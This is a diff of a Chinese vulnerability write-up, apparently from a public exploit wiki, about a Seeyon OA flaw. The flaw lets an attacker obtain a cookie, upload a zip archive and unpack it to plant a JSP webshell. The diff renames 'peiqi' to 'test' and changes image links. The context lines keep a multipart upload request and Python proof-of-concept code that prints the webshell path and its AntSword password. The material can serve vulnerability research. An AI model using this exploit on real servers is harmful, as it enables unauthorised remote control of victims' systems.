@@ -37,7 +37,7 @@ method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQz
 >
 > 返回包出现 Sset-Cookie 和 a8genius.do 即为成功获取
 
-![](image/zhiyuan-46.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-46.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 上传压缩包添加 Cookie上传
 
@@ -73,7 +73,7 @@ Content-Disposition: form-data; name="type"
 
 0
 --59229605f98b8cf290a7b8908b34616b
-Content-Disposition: form-data; name="file1"; filename="peiqi.png"
+Content-Disposition: form-data; name="file1"; filename="test.png"
 Content-Type: image/png
 
 PK....................______
@@ -106,7 +106,7 @@ method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayo
 >
 > 其中含有zip压缩包 shell.zip, 如果上传失败更改一下文件名
 
-![](image/zhiyuan-47.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-47.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```python
 # coding: utf-8
@@ -167,9 +167,9 @@ def POC_2(target_url, cookie, reg, headers):
         response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False)
         if response.status_code == 500:
             print("\033[32m[o] 目标 {} 解压文件成功.... \033[0m".format(target_url))
-            print("\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/peiqi10086.jsp \033[0m".format(target_url))
-            print("\033[32m[o] 蚁剑密码: peiqi \033[0m".format(target_url))
-            print("\033[32m[o] 如果目标webshell无法访问，请更换 peiqi_test.zip 中的木马名称 \033[0m".format(target_url))
+            print("\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/test10086.jsp \033[0m".format(target_url))
+            print("\033[32m[o] 蚁剑密码: test \033[0m".format(target_url))
+            print("\033[32m[o] 如果目标webshell无法访问，请更换 shell.zip 中的木马名称 \033[0m".format(target_url))
         else:
                 print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
     except Exception as e:
@@ -182,4 +182,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/zhiyuan-48.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-48.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
